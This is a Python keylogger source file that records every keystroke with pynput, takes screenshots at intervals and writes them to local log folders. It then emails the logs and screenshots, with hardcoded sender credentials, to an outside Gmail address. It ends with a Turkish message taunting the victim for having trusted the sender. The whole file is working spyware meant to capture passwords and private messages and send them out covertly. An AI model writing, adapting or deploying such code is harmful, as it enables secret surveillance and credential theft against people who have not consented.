from pynput.keyboard import Key, Listener
import os
import pyautogui
import time
from random import randint
from emailSender.mail_sender import Mail

logPath = r"C:\Users\ibatu\PycharmProjects\HackTools\Keyloggers\Resources\Logs\log.txt"
ssPath = r"C:\Users\ibatu\PycharmProjects\HackTools\Keyloggers\Resources\Screenshots\image"
key_count = 0
keys = []


def on_press(key):
    global key_count, keys
    key_count += 1
    # print(f"{key} yazıldı.")
    keys.append(key)

    while key_count >= 25:
        var = randint(1000, 10000)
        key_count = 0
        pyautogui.screenshot(f"{ssPath}{str(key)}{var}.png")
        write_file(keys)
        keys = []

    if key_count >= 100:
        mail = Mail("thewolverine0743@gmail.com", "123456tw", "ibatuhanbrl@gmail.com", "keylogger")
        mail.attach_text("Deneme")
        mail.attach_directory(r"C:/Users/ibatu/PycharmProjects/HackTools/Keyloggers/Resources/Screenshots/")
        mail.attach_directory(r"C:/Users/ibatu/PycharmProjects/HackTools/Keyloggers/Resources/Logs/")
        mail.send_mail()


def write_file(keys):
    with open(logPath, "a", encoding="utf-8") as file:

        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("Key") == -1:
                file.write(k)
            elif k.find("enter") > 0:
                file.write("\n")


def on_release(key):
    if key == Key.esc:
        print("Dosya kaydedildi.")
        return False


with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()

#  Send mail to user
mail = Mail("thewolverine0743@gmail.com", "123456tw", "ibatuhanbrl@gmail.com", "keylogger")
mail.attach_text("Sen cidden bana inandın mı ya kıyamam. Şimdi hack vaktiiii. PUHAHHAHAHAHAHHAHAH")
mail.attach_directory(r"C:/Users/ibatu/PycharmProjects/HackTools/Keyloggers/Resources/Screenshots/")
mail.attach_directory(r"C:/Users/ibatu/PycharmProjects/HackTools/Keyloggers/Resources/Logs/")
mail.send_mail()